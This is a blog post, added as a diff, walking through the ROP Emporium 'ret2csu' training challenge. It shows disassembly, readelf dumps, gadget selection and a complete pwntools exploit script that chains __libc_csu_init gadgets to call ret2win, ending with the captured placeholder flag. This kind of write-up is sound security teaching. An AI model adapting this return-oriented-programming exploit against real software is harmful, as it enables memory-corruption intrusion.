@@ -1,0 +1,226 @@
+---
+layout: post
+title:  "ROP Emporium: ret2csu"
+date:   2021-03-16 11:33:56 +0200
+categories: ropemporium
+---
+
+This is the final challenge of the series and this time we only have a ```64-bit``` target binary.
+We are given a ```PDF``` file from a ```BlackHat``` presentation from 2018, which was a great read.
+What is relevant out of that presentation is that the code inserted with the ```__libc_csu_init``` symbol can prove to be very useful.
+Though in the present it has been patched, this binary comes with the old implementation and provides us with plenty of useful ROP gadgets.
+Let's take a look at the disassembly and gather some relevant gadgets.
+```
+0000000000400640 <__libc_csu_init>:
+  400640:       41 57                   push   r15
+  400642:       41 56                   push   r14
+  400644:       49 89 d7                mov    r15,rdx
+  400647:       41 55                   push   r13
+  400649:       41 54                   push   r12
+  40064b:       4c 8d 25 9e 07 20 00    lea    r12,[rip+0x20079e]        # 600df0 <__frame_dummy_init_array_entry>
+  400652:       55                      push   rbp
+  400653:       48 8d 2d 9e 07 20 00    lea    rbp,[rip+0x20079e]        # 600df8 <__do_global_dtors_aux_fini_array_entry>
+  40065a:       53                      push   rbx
+  40065b:       41 89 fd                mov    r13d,edi
+  40065e:       49 89 f6                mov    r14,rsi
+  400661:       4c 29 e5                sub    rbp,r12
+  400664:       48 83 ec 08             sub    rsp,0x8
+  400668:       48 c1 fd 03             sar    rbp,0x3
+  40066c:       e8 5f fe ff ff          call   4004d0 <_init>
+  400671:       48 85 ed                test   rbp,rbp
+  400674:       74 20                   je     400696 <__libc_csu_init+0x56>
+  400676:       31 db                   xor    ebx,ebx
+  400678:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
+  40067f:       00
+  400680:       4c 89 fa                mov    rdx,r15
+  400683:       4c 89 f6                mov    rsi,r14
+  400686:       44 89 ef                mov    edi,r13d
+  400689:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
+  40068d:       48 83 c3 01             add    rbx,0x1
+  400691:       48 39 dd                cmp    rbp,rbx
+  400694:       75 ea                   jne    400680 <__libc_csu_init+0x40>
+  400696:       48 83 c4 08             add    rsp,0x8
+  40069a:       5b                      pop    rbx
+  40069b:       5d                      pop    rbp
+  40069c:       41 5c                   pop    r12
+  40069e:       41 5d                   pop    r13
+  4006a0:       41 5e                   pop    r14
+  4006a2:       41 5f                   pop    r15
+  4006a4:       c3                      ret
+  4006a5:       90                      nop
+  4006a6:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
+  4006ad:       00 00 00
+```
+We will also need the ```PLT``` entry of ```ret2win```:
+```
+0000000000400510 <ret2win@plt>:
+  400510:       ff 25 0a 0b 20 00       jmp    QWORD PTR [rip+0x200b0a]        # 601020 <ret2win>
+  400516:       68 01 00 00 00          push   0x1
+  40051b:       e9 d0 ff ff ff          jmp    4004f0 <.plt>
+```
+
+Now, since we have to call our goal function with 3 arguments, namely:
+```ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d```
+
+This can be easily achieved using the ```pop``` gadgets seen in the first disassembly, combined with the ```mov```'s.
+One problem however is that the ```mov``` for ```rdi``` is missing and, instead, we are provided with a ```mov edi, r13d```.
+Thus, we would only be able to pass ```0xdeadbeef``` as an argument.
+Luckily, this can also be easily solved with a ```pop rdi``` gadget found through an overlapping instruction at the ```pop r15```.
+```pop r15``` is comprised of the ```41 5f``` opcodes and ```5f``` corresponds to ```pop rdi```.
+So, another useful gadget:
+
+```0x4006a3: pop rdi; ret```
+
+Another issue we are going to have is that if we are to use the ```mov``` gadgets, we will have to pass into ```r12```  an address that hold as value an address that points to some useless instructions that end with a ```ret```.
+
+In order to find this we can simply look at the relocation and dynamic tables of the ELF file.
+```
+voidwalker@Abyss:[ret2csux64]** readelf --dynamic ret2csu
+
+Dynamic section at offset 0xe00 contains 26 entries:
+  Tag        Type                         Name/Value
+ 0x0000000000000001 (NEEDED)             Shared library: [libret2csu.so]
+ 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
+ 0x000000000000001d (RUNPATH)            Library runpath: [.]
+ 0x000000000000000c (INIT)               0x4004d0
+ 0x000000000000000d (FINI)               0x4006b4
+ 0x0000000000000019 (INIT_ARRAY)         0x600df0
+ 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
+ 0x000000000000001a (FINI_ARRAY)         0x600df8
+ 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
+ 0x000000006ffffef5 (GNU_HASH)           0x400298
+ 0x0000000000000005 (STRTAB)             0x4003c0
+ 0x0000000000000006 (SYMTAB)             0x4002d0
+ 0x000000000000000a (STRSZ)              122 (bytes)
+ 0x000000000000000b (SYMENT)             24 (bytes)
+ 0x0000000000000015 (DEBUG)              0x0
+ 0x0000000000000003 (PLTGOT)             0x601000
+ 0x0000000000000002 (PLTRELSZ)           48 (bytes)
+ 0x0000000000000014 (PLTREL)             RELA
+ 0x0000000000000017 (JMPREL)             0x4004a0
+ 0x0000000000000007 (RELA)               0x400470
+ 0x0000000000000008 (RELASZ)             48 (bytes)
+ 0x0000000000000009 (RELAENT)            24 (bytes)
+ 0x000000006ffffffe (VERNEED)            0x400450
+ 0x000000006fffffff (VERNEEDNUM)         1
+ 0x000000006ffffff0 (VERSYM)             0x40043a
+ 0x0000000000000000 (NULL)               0x0
+```
+Out of everything we can see, the most useless (which makes it useful to us) is ```_fini``` function:
+```
+00000000004006b4 <_fini>:
+  4006b4:       48 83 ec 08             sub    rsp,0x8
+  4006b8:       48 83 c4 08             add    rsp,0x8
+  4006bc:       c3                      ret
+```
+
+It basically does absolutely nothing at the end of its execution. Now we need to find where in the dynamic table it is located.
+
+```
+voidwalker@Abyss:[ret2csux64]** readelf -x .dynamic ret2csu
+
+Hex dump of section '.dynamic':
+  0x00600e00 01000000 00000000 01000000 00000000 ................
+  0x00600e10 01000000 00000000 38000000 00000000 ........8.......
+  0x00600e20 1d000000 00000000 78000000 00000000 ........x.......
+  0x00600e30 0c000000 00000000 d0044000 00000000 ..........@.....
+  0x00600e40 0d000000 00000000 b4064000 00000000 ..........@.....
+  0x00600e50 19000000 00000000 f00d6000 00000000 ..........`.....
+  0x00600e60 1b000000 00000000 08000000 00000000 ................
+  0x00600e70 1a000000 00000000 f80d6000 00000000 ..........`.....
+  0x00600e80 1c000000 00000000 08000000 00000000 ................
+  0x00600e90 f5feff6f 00000000 98024000 00000000 ...o......@.....
+  0x00600ea0 05000000 00000000 c0034000 00000000 ..........@.....
+  0x00600eb0 06000000 00000000 d0024000 00000000 ..........@.....
+  0x00600ec0 0a000000 00000000 7a000000 00000000 ........z.......
+  0x00600ed0 0b000000 00000000 18000000 00000000 ................
+  0x00600ee0 15000000 00000000 00000000 00000000 ................
+  0x00600ef0 03000000 00000000 00106000 00000000 ..........`.....
+  0x00600f00 02000000 00000000 30000000 00000000 ........0.......
+  0x00600f10 14000000 00000000 07000000 00000000 ................
+  0x00600f20 17000000 00000000 a0044000 00000000 ..........@.....
+  0x00600f30 07000000 00000000 70044000 00000000 ........p.@.....
+  0x00600f40 08000000 00000000 30000000 00000000 ........0.......
+  0x00600f50 09000000 00000000 18000000 00000000 ................
+  0x00600f60 feffff6f 00000000 50044000 00000000 ...o....P.@.....
+  0x00600f70 ffffff6f 00000000 01000000 00000000 ...o............
+  0x00600f80 f0ffff6f 00000000 3a044000 00000000 ...o....:.@.....
+  0x00600f90 00000000 00000000 00000000 00000000 ................
+  0x00600fa0 00000000 00000000 00000000 00000000 ................
+  0x00600fb0 00000000 00000000 00000000 00000000 ................
+  0x00600fc0 00000000 00000000 00000000 00000000 ................
+  0x00600fd0 00000000 00000000 00000000 00000000 ................
+  0x00600fe0 00000000 00000000 00000000 00000000 ................
+```
+
+Found it at ```0x600e48```. Great! Now we have a function for ```r12 + rbx * 8``` to dereference.
+
+Now all that is left is bypassing that check ```cmp rbp, rbx```. To do that, I am going to ```pop``` a 0 into ```rbx``` and a 1 in ```rbp``` during the ```pop``` gadget.
+
+Look like we are set! Let's build the script and grab the flag!
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = "amd64"
+context.bits = 64
+context.endian = "little"
+context.os = "linux"
+context.binary = "./ret2csu"
+
+# mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx * 8]; add rbx, 0x1;
+# cmp rbp, rbx; jne 400680; add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+movs_call_r12 = p64(0x400680)
+pops = p64(0x40069a) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+fini = p64(0x600e48) # address of _fini from .dynamic
+ret2win = p64(0x400510) # ret2win@plt
+
+payload = b'A' * 40
+payload += pops
+payload += p64(0)
+payload += p64(1)
+payload += fini
+payload += p64(0xdeadbeefdeadbeef)
+payload += p64(0xcafebabecafebabe)
+payload += p64(0xd00df00dd00df00d)
+payload += movs_call_r12
+payload += p64(0) * 7
+payload += p64(0x4006a3) # pop rdi; ret
+payload += p64(0xdeadbeefdeadbeef)
+payload += ret2win
+
+e = context.binary
+
+io = e.process()
+
+print(io.recvuntil(">"))
+
+io.sendline(payload)
+
+print(io.recvrepeat())
+
+with open("payload", "wb") as file:
+    file.write(payload)
+```
+
+Aaaaaand the flag:
+
+```
+voidwalker@Abyss:[ret2csux64]** ./exploit.py
+[*] '/home/voidwalker/ROPEmporium/ret2csux64/ret2csu'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+[+] Starting local process '/home/voidwalker/ROPEmporium/ret2csux64/ret2csu': pid 30764
+b'ret2csu by ROP Emporium\nx86_64\n\nCheck out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n\n>'
+[*] Process '/home/voidwalker/ROPEmporium/ret2csux64/ret2csu' stopped with exit code 0 (pid 30764)
+b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
+```
+
+And with this we end our ```ROPEmporium``` series. This last challenge was interesting, but the most difficult was definetely the ```64-bit``` binary for ```fluff``` .
+This was a great learning experience and I hope other binaries will be added soon. :)
